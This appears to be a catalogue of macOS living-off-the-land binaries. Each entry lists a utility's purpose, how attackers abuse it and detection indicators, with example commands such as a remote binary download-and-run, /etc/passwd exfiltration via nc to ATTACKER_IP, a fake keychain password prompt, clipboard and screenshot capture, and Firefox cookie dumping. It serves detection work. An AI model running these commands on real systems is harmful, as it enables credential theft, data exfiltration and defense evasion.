description: Uses the CommandLine/Terminal to return type, creator, attributes, created, and modified file information of a file or directory.
native_purpose: Get attributes of files and directories.
known_behaviors: Iterate through a directory to GetFileInfo
A bash or zsh oneliner can provide an attacker with information about specific files of interest.
command_examples: for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done
indicators: No detections at time of publishing

description: Uses the CommandLine/Terminal to set file and or directory attributes. It can set attributes, creator, creation date, modification date, and file type for multiple files at a time.
native_purpose: Set attributes of files and directories.
known_behaviors: Set a file or directory attribute to invisible
A bash or zsh oneliner can allow an attacker to set the file attribute to invisible. This action can establish persistence and evade detection for malicious files on the system.
Change a file's creation and modification timestamps
Setfile can be used with the -d and -m arguments to alter a file's creation and modification date, respectively.
command_examples: for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done
indicators: No detections at time of publishing

description:
caffeinate creates assertions to alter system sleep behavior.  If no assertion flags are specified, caffeinate creates an assertion to prevent idle sleep.
If a utility is specified, caffeinate creates the assertions on the utility's behalf, and those assertions will persist for the duration of the utility's execution.
Otherwise, caffeinate creates the assertions directly, and those assertions will persist until caffeinate exits.
native_purpose: Prevent the system from sleeping on behalf of a utility.
known_behaviors: Fork a process
Make caffeinate fork a process and hold an assertion that prevents idle sleep as long as that process is running
Prevent a sleep
Prevent a macOS from going to sleep for 4 hours (14400 seconds)
indicators: No detections at time of publishing

description:
The chflags utility modifies the file flags of the listed files as 
specified by the flags operand.
native_purpose: Changes file or directory flags
known_behaviors: Hide a file

Add the hidden flag to a file or directory to prevent it from being 
visible in Finder and Terminal.
Remove hidden flag

Remove the hidden flag to a file or directory to make it visible in Finder
and Terminal.
indicators: Sigma: Hidden Flag Set On File/Directory Via Chflags

description: The codesign command is used to create, check, and display code signatures, as well as inquire into the dynamic status of signed code in the system.
native_purpose: Create, manipulate and verify code signatures.
known_behaviors: Ad-hoc codesigning an app bundle
This command forcefully re-signs the MyApp.app application with an ad-hoc signature, applying the signature deeply to all nested code within the app
indicators: Jamf Protect: Detect ad-hoc codesigning activity

description: Used to enable/disable SIP, configure netboot and authenticated-root settings
native_purpose: Configure or view system security policies.
known_behaviors: Disable SIP
disable SIP (System Integrity Protection) - requires booting into recovery mode
Disable authenticated-root
When authenticated-root is disabled, booting is allowed from non-sealed system snapshots - requires booting into recovery mode
Add a netboot server
Insert a new IPv4 address in the list of allowed NetBoot sources
Map infrastructure
List allowed NetBoot sources
Determine if SIP is enabled
Determine if System Integrity Protection is enabled

description: The defaults binary is normally used to interact with the user defaults system, a database of macOS used to manage system settings much like the Windows Registry. The database can be abused by threat actors to change settings in attempt to evade defenses or to gain persistence.
native_purpose: Read, write, and delete user preference values.
known_behaviors: Disable Gatekeeper's auto rearm functionality
The following command can be used to disable Gatekeepers rearm functionality. This command requires root privileges.
Show mounted servers
Show all mounted servers on the desktop.
Add a login item to the current user
An attacker can use defaults to add a login hook in attempt to gain persistence. This command requires root privileges.
Get Active Directory user info from Jamf Connect
Retrieve Active Directory user info from Jamf Connect defaults configuration.
Enable Firewall
Enables macOS' default firewall. This command requires root privileges.
Disable Firewall
Disables macOS' default firewall. This command requires root privileges.
indicators: No detections at time of publishing

description: disown is a system utility that can be utilized to persist a shell process after a terminal has been closed or a shell session has been terminated. This is accomplished by preventing a SIGHUP from being sent to the running job, and removing the process from the shell jobs table. Unlike nohup which is used during process initialization, disown can be used to modify an existing process.
native_purpose: Prevents a process from being terminated when a shell session or terminal is closed.
known_behaviors: Start a process and remove it from the jobs table.
The following command downloads a remote binary, sets it to executable, executes the binary, disowns it from the shell it spawned from, and closes the terminal session.
command_examples: curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown && pkill Terminal
indicators: No detection content at time of writing

description: ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.
native_purpose: Copy files and directories while preserving file attributes and permissions.
known_behaviors: Copy and compress sensitive data locally
The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.
Remove extended attributes from a file
ditto can be used to bypass Gatekeeper by removing the "com.apple.quarantine" extended attribute.
Copy, compress, and transfer sensitive data to a remote macOS host
The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.
DLL hijacking
Replace a legitimate library with a malicious one while maintaining the original file permissions and attributes.
command_examples: ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null
indicators: No detection content at time of writing

description: dns-sd can be used to interact with the Multicast DNS (mDNS) and DNS Service Discovery (DNS-SD) protocols. The tool is useful for administrators but can also be abused by malicious actors to discover local network services.
native_purpose: Discover local network services using the DNS-Based Service Discovery (SD) protocol.
known_behaviors: Discover SSH hosts
Hosts serving SSH can be discovered using the _ssh._tcp service string.
Discover web hosts
Hosts serving web services can be discovered using the _http._tcp service string.
Discover hosts serving remote screen sharing
Hosts serving remote screen sharing can be discovered using the _rfb._tcp service string.
Discover hosts serving SMB
Hosts serving SMB can be discovered using the _smb._tcp service string.
indicators: Jamf Protect: Detect dns-sd discovery activity

description:
dscacheutil does various operations against the Directory Service cache including gathering statistics, initiating lookups, inspection, cache flush, etc.
This tool replaces most of the functionality of the lookupd tool previously available in the OS.
native_purpose: gather information, statistics and initiate queries to the Directory Service cache.
known_behaviors: Lookup  a user
List the user information
Lookup all users
List all user information
indicators: No detections at time of publishing

description: An extensive tool for communicating with the Directory Services, useful for Discovery.
native_purpose: Interact with Directory Services.
known_behaviors: Local user enumeration
Enumerate all local users.
Active Directory user enumeration
Enumerate all Active Directory users.
Local user information gathering
Gain useful local user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.
Active Directory user information gathering
Gain useful Active Directory user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.
Local group enumeration
Enumerate all local groups.
Active Directory group enumeration
Enumerate all Active Directory groups.
Local group information gathering
Gain useful local group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the "admin" group.
Active Directory group information gathering
Gain useful Active Directory group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the "admin" group.
Computer enumeration
Enumerate all computers in an Active Directory.
Share enumeration
Enumerate all shares.
Password policy discovery
Gain password policy information
Change a user password
Change an existing user's password.
Local account creation
Create a local account
command_examples:
dscl "/Active Directory/TEST/All Domains" -list /Users
dscl "/Active Directory/TEST/All Domains" list /Users
dscl "/Active Directory/TEST/All Domains" ls /Users

dscl "/Active Directory/TEST/All Domains" -read /Users/$USERNAME
dscl "/Active Directory/TEST/All Domains" read /Users/$USERNAME
dscl "/Active Directory/TEST/All Domains" cat /Users/$USERNAME

dscl "/Active Directory/TEST/All Domains" -list /Groups
dscl "/Active Directory/TEST/All Domains" list /Groups
dscl "/Active Directory/TEST/All Domains" ls /Groups

dscl "/Active Directory/TEST/All Domains" -read /Groups/$GROUPNAME
dscl "/Active Directory/TEST/All Domains" read /Groups/$GROUPNAME
dscl "/Active Directory/TEST/All Domains" cat /Groups/$GROUPNAME

dscl  "/Active Directory/TEST/All Domains" -list /Computers
dscl  "/Active Directory/TEST/All Domains" list /Computers
dscl  "/Active Directory/TEST/All Domains" ls /Computers
indicators: Jamf Protect: Detect user account creation with dscl

description: This tool allows command-line configuration of the Active Directory Plug-in. dsconfigad has the same functionality for configuring the Active Directory plugin as the Directory Utility application. It requires "admin" privileges to the local workstation and to the Directory to make changes.
native_purpose: retrieves/changes configuration for Directory Services Active Directory Plugin.
known_behaviors: Retrieves the Active Directory configuration
Retrieves the Active Directory configuration
Retrieves the Active Directory name
Retrieves the Active Directory name
indicators: No detections at time of publishing

description: dsexport is a command-line utility designed to export records from the directory services database on a local host or from a connected LDAP service. The tool can be used to gather information about users, groups, and computers. The tool can also be used to export the directory services database to a file for offline analysis.
native_purpose: Export data from an Open Directory directory services server.
known_behaviors: Export local host users
Export the local host user information to a file
Export local host groups
Export the local host group information to a file
indicators: No detections at time of publishing

description: funzip is a macOS utility that extracts a ZIP or gzip file directly to output from archives or other piped input. The malicious binaries use funzip to extract the malicious binary with a password and using head or tail commands.
native_purpose: The malicious binaries use funzip to extract the malicious binary with a password and using head or tail commands.
known_behaviors: extracts a ZIP or gzip file directly to output from archives or other piped input

funzip is a macOS utility used to extract ZIP or gzip files directly to output. Malicious binaries misuse funzip, along with head or tail, to extract and reconstruct password-protected malicious payloads.
indicators: No detections at time of publishing

description: hdiutil manipulates disk images such as DMG and ISO files. You can mount, unmount, create, resize and verify disk images. Including encrypted images.
native_purpose: Manipulate disk images using the DiskImages framework.
known_behaviors: Mount a malicious dmg file
Uses hdiutil to mount a malicious dmg file to the system.
Mount a malicious dmg file
Uses hdiutil to mount a malicious dmg file to the system.
Mount a malicious iso file
Uses hdiutil to mount a malicious iso file to the system.
Mount a malicious iso file
Uses hdiutil to mount a malicious iso file to the system.
Exfiltrate data in dmg file
Uses hdiutil to create a dmg file to store exfiltrate data
Exfiltrate data in encrypted dmg file
Uses hdiutil to create a dmg file to store exfiltrate data
indicators: Sigma: Disk Image Mounting Via Hdiutil
Sigma: Disk Image Creation Via Hdiutil

description: The I/O Kit registry (ioreg) is a useful binary that can be used to gather data such as detecting if a VM is used, getting USB device vendor names, checking if a screen is locked, etc.
native_purpose: Displays a hierarchial view of the I/O Kit registry.
known_behaviors: Use ioreg to check whether the remote macOS screen is locked.
The following command will display a list of keys that contain "CGSSession". If the key "CGSSessionScreenIsLocked" is present, the screen is actively locked.
Use ioreg to check whether the host is on a physical machine or a VM
Check the output of this command (specifically the IOPlatformSerialNumber, board-id, and manufacturer fields) to check whether or not this host is in a virtual machine.
Use ioreg to check USB device vendor names

Grep for "USB Vendor Name" values to view USB vendor names. On virtualized hardware these values may contain the hypervisor name such as "VirtualBox". This is an additional way to check for virtualization.
Check all ioreg properties for hypervisor names.
Grep for "virtual box", "oracle", and "vmware" from the output of the ioreg -l command. This is an additional way to check for virtualization.
indicators: Jamf Protect: Ioreg used to detect if the screen is locked

description: Deprecated tool in favor of kmutil. Lists loaded kernel extensions
native_purpose: Display the status of loaded kernel extensions (kexts)
known_behaviors: List kernel extensions
Uses kexstat showloaded to display kernel extensions and address in kernel memory it has been loaded
indicators: No detections at time of publishing

description: The command shows a list of user sessions including the user name, terminal used, host name, start and stop times, and duration. It also indicates if a session is still active or was terminated unexpectedly.
native_purpose: Show last user logins and TTYs.
known_behaviors: Enumerate the users who are currently logged into the system.
The following command will display sessions that are currently active.
Enumerate all user accounts that have logged into the system previously.
The last command can be used to output users who have previously logged in, by specifying the tty interface 'console'.
Enumerate all hosts that have remotely logged into the system before.
An attacker can use 'last' with a filter to retrieve the connection date and remote host information for remote logins.

description: launchctl can be used to load, start, stop, and unload macOS services. It is a command-line frontend to launchd.
native_purpose: Interact with LaunchAgents and LaunchDaemons.
known_behaviors: Use launchctl to execute an application
A oneliner that will load a plist as a LaunchAgent or LaunchDaemon, achieving persistence on a target machine. This command requires root privileges.
Persistent launch agent
Creation of a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist
indicators: LaunchAgents and LaunchDaemons must have a plist file on disk in the root, system, or user Library directory. Monitoring for plist's with executables located in /tmp or /Shared could identify suspicious applications.
Jamf Protect: Detect launchctl activity that unloads or bootsout specific service

description: The log command can be used to access system log messages from Apple Unified Logging (AUL). The tool can be used to inspect existing logs, stream logs in realtime, and delete logs. This tool is normally used by system admins and application developers for troubleshooting purposes but can be used by an adversary to gain an understanding of the user's behavior or to cover up their tracks by deleting log messages.
native_purpose: Access system log messages from Apple Unified Logging (AUL).
known_behaviors: Remove all log messages
An attacker can cover up their tracks by removing all log messages using the following command. Requires root privileges.
Search log messages for tokens
An attacker can potentially search log messages and review if they do contain sensitive information like jwt tokens.
indicators: No detections at time of publishing

description: lsregister is used to build, dump, and check the validity of the Launch Services database. This database is often abused to create custom URL scheme handlers that point to malicious apps.
native_purpose: Interact with the macOS Launch Services database.
known_behaviors: Force an update of the Launch Services database
The -f flag can be used to force an update of the Launch Services database. This can be used to quickly register a custom URL scheme that points to a malicious app.
Get a list of apps and their bindings
The -dump flag can be used to get a list of apps and their bindings
Delete the Launch Services database
The -delete flag can be used to delete the Launch Services database to impact normal operation of the system.
indicators: No detections at time of publishing

description: mdfind to locate files on MacOS by searching a pre-built database. It is a command-line alternative to Spotlight in MacOS
native_purpose: Locate files using the Spotlight database.
known_behaviors: Use mdfind to provide live updates to the number of files matching the query
A bash or zsh oneliner can cause mdfind to provide an attacker with live updates to the number of files on a system.
Use mdfind to search for AWS Keys
Allows an attacker to query the filesystem via the CommandLine/Terminal to search for AWS keys.
Use mdfind to search for apps to infect
Allows an attacker to determine if specific applications are installed and can be leveraged
command_examples: set appId to do shell script "mdfind kMDItemCFBundleIdentifier = '" & bundleId & "'"
indicators: Jamf Protect: Detect activity related to mdfind used to search for stored AWS keys

description: mdls list file metadata across standard metadata (creation date, size), extended attribute (quarantine), and Spotlight APIs (Finder flags).
native_purpose: List metadata attributes for the specified file.
known_behaviors: Validate file download information
Use mdls to validate payload download sources and timestamps to guard against sandbox executions.
Query File Paths
Use mdls to print file paths and sizes when enumerating host resources.
indicators: No detections at time of publishing

description: The mktemp binary located in "usr/bin/mktemp" can generate unique directory or file names and has historically been used to generate unique payloads.
native_purpose: Create a temporary file or directory and return the file/directory name to stdout
known_behaviors: Generate payload directory (Shlayer)
The following command can be used to generate a random directory name for staging payloads
Generate directory based on template file (Bundlore)
The following command can be used to generate a unique directory based on a template
indicators: No detections at time of publishing

description: networksetup is an extensive tool for reading and setting various network configuration details useful for Discovery and Command and Control.
native_purpose: Configure network settings in System Preferences.
known_behaviors: network device enumeration
Use networksetup to display services with corresponding port and device in order they are tried for connecting to a network.
Detect connected network hardware
Use networksetup to detect new network hardware and create a default network service on the hardware.
network device enumeration
Use networksetup to list all network interfaces, providing name, device name, MAC address.
network device enumeration
Use networksetup to list all network interface names.
DNS server enumeration
Use networksetup to get configured DNS servers for a specific interface.
Enumerate configured web proxy URL for an interface
Displays web proxy auto-configuration information for the specified interface.
Enumerate configured web proxy for an interface
Displays standard web proxy information for the specified interface.
Set the https web proxy for an interface
Use networksetup to set the https web proxy for an interface.
Set the http web proxy for an interface
Use networksetup to set the http web proxy for an interface.
Set auto proxy URL for an interface
Use networksetup to set the proxy URL for an interface.
Enable auto proxy state
Use networksetup to enable the proxy auto-config
indicators: No detections at time of publishing

description: The notifyutil binary is a command-line interface to the notify(3) API and notifyd(8) daemon, which manages Darwin notifications on macOS. This utility enables posting notifications, monitoring system-wide notification keys, and manipulating state values associated with notification keys. While designed for legitimate inter-process communication (IPC), notifyutil can be abused by threat actors to monitor system events (like screen lock, network changes, timezone updates), establish covert communication channels between processes, or gather intelligence about system state changes without triggering traditional security monitoring.
native_purpose: Monitor and post Darwin notifications for inter-process communication and system event monitoring.
known_behaviors: Monitor system events for reconnaissance

An attacker can register for system notification keys to detect when the user locks their screen, changes network state, or other system events without using more easily detected APIs. The following example monitors for screen lock events.
Establish covert inter-process communication channel

Threat actors can use Darwin notifications as a covert IPC mechanism to coordinate between malicious processes. By posting and monitoring custom notification keys with associated state values, malware components can exchange commands and data without using traditional IPC methods that may be monitored.
Monitor network state changes for data exfiltration timing

An attacker can monitor for network configuration changes to determine optimal timing for data exfiltration. This allows malware to detect when the system connects to networks and adjust behavior accordingly.
Monitor timezone changes for geolocation tracking

Monitoring timezone change notifications can help an attacker track when a target device moves between geographic locations or when users travel, providing intelligence about the target's physical location and movement patterns.
Monitor login/logout events for privilege escalation timing

By monitoring authentication-related notification keys, an attacker can detect login and logout events to time privilege escalation attempts or other malicious activities when defenses may be weakened during authentication transitions.
Query system notification state values for reconnaissance
Threat actors can query state values of system notification keys to gather information about the current system configuration without executing more suspicious commands.
command_examples:
# Sender process
notifyutil -p com.example.hidden.channel -s com.example.hidden.channel 1337

# Receiver process in another terminal/process
notifyutil -1 com.example.hidden.channel -g com.example.hidden.channel

notifyutil -g com.apple.system.timezone
notifyutil -g com.apple.loginwindow.logout
notifyutil -g com.apple.screenIsLocked
indicators: Monitor notifyutil execution with suspicious notification keys
Detect notifyutil monitoring non-standard or custom notification keys (keys not starting with com.apple)
Monitor long-running notifyutil processes (using -w flag for sustained monitoring)
Detect notifyutil usage in conjunction with known malware indicators or suspicious parent processes

description: macOS version of curl that is used to download files to a target without applying the quarantine extended attribute
native_purpose: Download, upload, and read files.
known_behaviors: Download file
Download file and ignore cert checking
Download file
Download file to the Downloads directory using -dl
Download file
Download file to a designated directory using -dir
indicators: Jamf Protect: Detect all curl and nscurl activity
Jamf Protect: Detect file downloads using the insecure argument for curl and nscurl
Sigma: File Download Via Nscurl - MacOS

description: Access and manage the host's non-volatile random-access memory (NVRAM).
native_purpose: Access and manage the host's non-volatile random-access memory (NVRAM).
known_behaviors: Get nvram variables
The -p option prints all the nvram variables that contain some potentially sensitive information like WiFi SSIDs and Bluetooth devices.
indicators: No detections at time of publishing.

description: To look at internal state information for opendirectoryd, enable or disable logging, or change statistics settings.
native_purpose: odutil allows caller to examine or change state of opendirectoryd
known_behaviors: Listing the available node names
List all available node names
Retrieves active session
Retrieves all active sessions
Retrieves "Default search policy"
Retrieves the configuration of "Default search policy"
Retrieves "Contact search policy"
Retrieves the configuration of "Contact search policy"
indicators: No detections at time of publishing

description: The open command-line utility can be used to open files, folders, app, URLs or header files in their associate macOS app.
native_purpose: Open files, folders, apps, URLs, and header files.
known_behaviors: Open a malicious file
The open command can be used to open a malicious macOS app from the terminal.
Download a malicious file
The following command downloads the payload.zip file in the default browser (Safari) and then kills it.
indicators: No detections at time of publishing

description: osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OSA) that Apple uses for its scripting languages, like AppleScript and JavaScript for Automation (JXA). osacompile accepts AppleScript code as input and produces a compiled script file, which can be either a script file (.scpt), an app (.app), a droplet, or a script bundle.
native_purpose: Compile AppleScripts or OSA language scripts.
known_behaviors: Download and compile a payload
The following command downloads an applescript payload from getpayload.com and compiles it into an app.
indicators: Sigma: In-Memory Download And Compile Of Payloads (experimental/pending)

description: The osascript binary is a command-line utility included in macOS that allows users to run AppleScript and Open Scripting Architecture (OSA) scripts or commands. AppleScript is a scripting language that is designed for power users to automate various tasks, application actions, and to interact with the operating system.
native_purpose: Execute AppleScripts and other OSA language scripts and commands.
known_behaviors: Use the osascript binary to gather sensitive clipboard data

A bash loop can gather clipboard contents over a defined time period. The following command calls /usr/bin/osascript -e 'return (the clipboard)' indefinitely every 10 seconds and writes clipboard content to a text file.
Use the osascript binary to gather system information
osascript can be used to gather the operating system version, current username, user ID, computer name, IP address, and other information.
Use the osascript binary to prompt the user for credentials
osascript can be used to generate a dialogue box and request the user to enter the keychain password.
Use the osascript binary to execute a JXA (JavaScript for Automation) file.

JXA is often used by red teams (and potentially attackers) as a macOS payload, as JXA is native to macOS and can access various internal macOS APIs (such as Cocoa, Foundation, OSAKit, etc.). The osascript binary can be used to execute JXA payloads by simply running "osascript [file.js]" but some malware or offensive tools may also use "osascript -l JavaScript [file.js]".
command_examples: while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done

osascript -e 'set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns" with title "Authentication Needed" with hidden answer'
indicators: Command Line Argument Detection (args contain osascript AND -e AND clipboard)
Jamf Protect: Detect activity that is related to osascript gathering clipboard content
Jamf Protect: Detect activity that is related to osascript pulling system information
Jamf Protect: Detect activity that is related to generating dialogs using osascript and asking for specific user input

description: Retrieves the contents of the clipboard (a.k.a. pasteboard) and writes them to the standard output (stdout). The utility is often used for creating new files with the clipboard content or for piping clipboard contents to other commands. It can also be used in shell scripts that may require clipboard content as input.
native_purpose: Paste the contents of clipboard to the terminal.
known_behaviors: Use pbpaste to collect sensitive clipboard data

A pbpaste bash loop can continuously collect clipboard contents every x minutes and write contents to a file (or another location). This may allow an attacker to gather user credentials or collect other sensitive information.
command_examples: while true; do echo $(pbpaste) >> loot.txt; sleep 10; done
indicators: Sigma: Clipboard Data Collection Via Pbpaste

description: pkill is a Unix utility available on macOS that sends signals to processes matching a given name or pattern. While intended for legitimate process management, threat actors can abuse pkill to terminate security tools, monitoring daemons, or user applications for defense evasion. It's particularly valuable to attackers as a Living Off the Land technique that avoids bringing custom binaries onto the system.
native_purpose: Kill processes by name or pattern.
known_behaviors: Kill security tools
Terminate defensive processes like firewalls, AV, or monitoring tools.
Force kill processes with SIGKILL
Use the -9 signal to forcefully terminate processes that may not respond to normal termination signals. Useful for killing hung security tools.
Kill all processes for a user
Terminate all processes belonging to a specific user, potentially ending user sessions or disrupting monitoring.
Kill logging and monitoring daemons
Terminate system logging and monitoring processes to evade detection.
Kill process by exact name match
Use exact matching with -x flag to kill specific process by exact name rather than pattern.
indicators: Endpoint Detection - pkill targeting security tools

description: plutil is a command-line utility used for managing property list (.plist) files. These files are commonly used by macOS to store a app settings and other configuration info. The utility allows users to check the validity of plist files `plutil -lint`, convert plist files between XML and binary formats (plutil -convert), and add, modify or remove plist key value pairs.
native_purpose: Read, create or edit plist files.
known_behaviors: Set app to run with dock icon hidden
plutil can be used to set the "LSUIElement" attribute to true which will force the targeted app to run without the UI and dock icon.

description: Profiles on macOS are responsible for managing different types of profiles including configuration, provisioning, bootstraptoken, or enrollment. However, starting from macOS 11.0, this tool cannot be used for installing configuration profiles.
native_purpose: List and remove configuration profiles.
known_behaviors: Collect system DEP information.
The following command determines whether device is DEP(Device Enrolment Program) enabled and output the DEP information.
Remove configuration profiles.
The following command deletes the specified profiles. An optional password used when removing a configuration profile which requires the password removal option.
indicators: No detections at time of publishing.

description: safaridriver is a tool that is used to enable Selenium testing via the macOS WebDriver protocol. Once enabled, the WebDriver API could be abused by attackers to communicate with external servers for command and control or exfiltration purposes.
native_purpose: Enable the WebDriver Safari browser API for Selenium testing.
known_behaviors: Enable safaridriver
The following command can be used to enable the WebDriver Safari browser API. The command must be run as root or with sudo privileges.
indicators: No detections at time of publishing

description: This tool uses the Speech Synthesis manager to convert input text to audible speech and either play it through the sound output device chosen in System Preferences or save it to an AIFF file.
native_purpose: Convert text to audible speech.
known_behaviors: Read sensitive data
The following command can read and process sensitive files and redirects the output to a file..
Collect clipboard data

The command is designed to enhance privacy by muting the system volume,using a less recognizable "Whisper" voice with the "say" command, processing the copied text in the clipboard, and saving the output to a file named "loot.txt."
command_examples: osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;

description: A tools that allows users to take screenshots of their desktop or specific app windows. The tool can be used by malicious actors to collect sensitive information from the targeted system.
native_purpose: Capture a screenshot from command line.
known_behaviors: Continuously capture screenshots
The following command demonstrates how an attacker can use the tool to capture screenshots every 10 seconds. The -x flag prevents snapshot sounds from being played.
command_examples: while true; do ts=$(date +"%Y%m%d-%H%M%S"); o="/tmp/screenshots"; screencapture -x "$o/ss-$ts.png"; sleep 10; done

description: scutil provides a command line interface to the dynamic store data maintained by configd. Interaction with this data (using the SystemConfiguration.framework SCDynamicStore APIs) is handled with a set of commands read from standard input.
native_purpose: Display basic network information, check the dns config, set the computer hostname and perform several other tasks.
known_behaviors: DNS configuration
Get the current DNS configuration of the systems
Proxy configuration
Get the current proxy configuration of the systems
Network reachability
Check if the destination host is reachable from your Mac
Hostname, localhost name and computername
Display the current hostname, localhost name and computername
indicators: No detections at time of publishing

description: security is a command-line utility included in macOS that allows users to interact with the Keychain app. Keychains allow users to manager passwords and credentials for many services and features, including Wi-Fi and website passwords, secure notes, certificates, and Kerberos.
native_purpose: Interact with Keychain, macOS's built-in password manager.
known_behaviors: Dump credentials, keys, certificates, and other sensitive information from Keychain
This command will dump keychain passwords from login.keychain
Retrieve Chrome's "Chrome Safe Storage" password manager secret
This command will retrieve the Chrome Safe Storage password manager secret from the keychain.
Add an arbitrary trusted certificate to aid a MITM attack
This command will add a certificate to the keychain.
indicators: Sigma: Credentials from Password Stores - Keychain
Elastic: Access to Keychain Credentials Directories
Elastic: Credential Access Dumping Keychain Security
Elastic: Keychain Password Retrieval via Command Line
Jamf Protect: Detect Keychain dumping using security

description: sfltool allows interactions with the Shared File List framework, which can be used to modify application recent documents, favorites, and more.
native_purpose: Binary to manage the Shared File List framework.
known_behaviors: Display Login Items
Identify all current login and background items configured on the system.
Reset Login Items to Defaults
Reset all third-party Login Items and revert to installation defaults.
indicators: Jamf Protect: Detect attempts to dump BTM or being reverted to installation defaults

description: A command-line utility for running software updates.
native_purpose: Interact with the macOS software update service.
known_behaviors: Get OS and browser version information
Determine OS and Safari version by enumerating the available software updates.
Get OS update policy
Use the --schedule flag to return the OS update policy.
indicators: No detections at time of publishing

description: Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.
native_purpose: Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.
known_behaviors: Disable Gatekeeper
The --master-disable switch disables Gatekeeper. The command must be run with root/sudo permission.
indicators: Elastic Detection Rules: Attempt to Disable Gatekeeper

description: sqlite is a command-line utility that allows users to query and manage sqlite databases. Many components of macOS and apps used sqlite to store data. Attackers can leverage this tool to discover sensitive data.
native_purpose: Query and manage sqlite databases.
known_behaviors: Get apps with Full Disk access
The following command interacts with the TCC (Transparency, Consent, and Control) database to show the apps that have Full Disk access permission
Get Firefox cookie data
The following one-liner can be used to kill Firefox and dump cookie data from the user's Firefox profile.
View URL associated with file downloads
The following sqlite command is commonly used by macOS malware to view the URL in which the payload was downloaded from.
command_examples:
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
'select client from access where auth_value and service = "kTCCServiceSystemPolicyAllFiles"'
killall firefox; find ~/Library/Application\ Support/Firefox/Profiles/. | grep cookies.sqlite | xargs -I {} sqlite3 {} "select * from moz_cookies"
indicators: Elastic Detection Rules: Potential Privacy Control Bypass via TCCDB Modification
Splunk Security Content: Suspicious SQLite3 LSQuarantine Behavior
Jamf Protect: Detect SQLite3 activity used to associated URLs with downloaded files

description: ssh-keygen is a tool for creating new authentication key pairs for SSH (Secure Shell). ssh-keygen holds the "com.apple.security.cs.disable-library-validation" entitlement and is capable of loading arbitrary libraries without requiring signed code.
native_purpose: Load unsigned dynamic libraries into the ssh-keygen binary.
known_behaviors: Execute malicious dynamic library (.dylib) from standard input
An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.
indicators: Recommendations included in resource below. No formal detection content at this time.

description: streamzip is a system utility that can be utilized to compress data from "stdin" and write the data directly to "stdout", no temporary files are created. The tool can be used by malicious actors to collect and exfiltrate sensitive data without leaving staged data archive artifacts on disk.
native_purpose: File-less compression of data passed in through stdin.
known_behaviors: Copy and compress sensitive data locally
The following command reads file data and compresses the data for exfiltration
command_examples: dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT
indicators: No detection content at time of writing

description: sw_vers prints macOS version information, including the exact macOS version number.
native_purpose: Prints macOS version information.
known_behaviors: Retrieving macOS Version Information
Fetch detailed macOS version information including the build version, product name, and product version.
Retrieving macOS Product Version
Fetch macOS product version.
Retrieving macOS Product Name
Fetch detailed macOS product name.
Retrieving macOS Build Version
Fetch detailed macOS build version.
indicators: No detections at time of publishing

description: The swift command is an interactive environment (REPL) for Swift.
native_purpose: Arbitrarily execute swift code from the terminal.
known_behaviors: Execute Swift code file
Executes the Swift code that is in a .swift file
Execute Swift one-liner before swift 5.8 / Xcode 14.3 Beta 1
Executes a Swift one-liner by piping an echoed string into the swift command
Execute Swift one-liner with swift 5.8 / Xcode 14.3 Beta 1 or greater
Executes a Swift one-liner that executes the ls command to list the current directory using the -e option that was implemented in swift 5.8 / Xcode 14.3 Beta 1
command_examples: swift -e 'import Foundation; let process = Process(); process.executableURL = URL(fileURLWithPath:"/bin/bash"); process.arguments = ["-c", "ls -alh"]; let stdout = Pipe(); let stderr = Pipe(); process.standardOutput = stdout; process.standardError = stderr; try process.run(); print(String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)); print(String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self));'
indicators: Process & Command Line Argument Detection (process contains swift)
Jamf Protect: Detect arbitrary code execution using a swift one-liner

description:
sysadminctl can administer system user accounts. sysadminctl can be used to change user passwords, create new 
users (including automatically provisioning the user home folder) or to check the status of a user's SecureToken.
native_purpose: Create/delete local accounts, guest account, enable SMB/AFP Guest access.
known_behaviors: Enable Guest Account
sysadminctl can be used to enable the guest account
Create Local User Account
sysadminctl can be used to create a local user account
Create a Local Admin Account
sysadminctl can be used to create a local admin account
Reset user password
sysadminctl can be used to reset password for a particular user account
Delete a local account
sysadminctl can delete the specified user account
Enable SMB Guest Access
sysadminctl can enable SMB Guest Access
Enable AFP Guest Access
sysadminctl can enable AFP Guest Access
indicators: Sigma: Creation Of A Local User Account
Sigma: User Added To Admin Group Via Sysadminctl
Sigma: Guest Account Enabled Via Sysadminctl

description: Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine.
native_purpose: Get macOS hardware model information.
known_behaviors: Use sysctl to gather macOS hardware info.
sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.
indicators: Jamf Protect: Detect activity related to sysctl in an interactive shell

description: system_profiler reports on the hardware and software configuration of the system. It can generate plain text reports or XML reports which can be opened with System Information.app
native_purpose: Reports system hardware and software configuration.
known_behaviors: Listing the available datatypes
List all available sub-systems to get information from.
Print hardware information
Prints an overview of the hardware of the current machine, including its model name and serial number.
Print software information
Prints an overview of the software of the current machine, including the exact macOS version number.
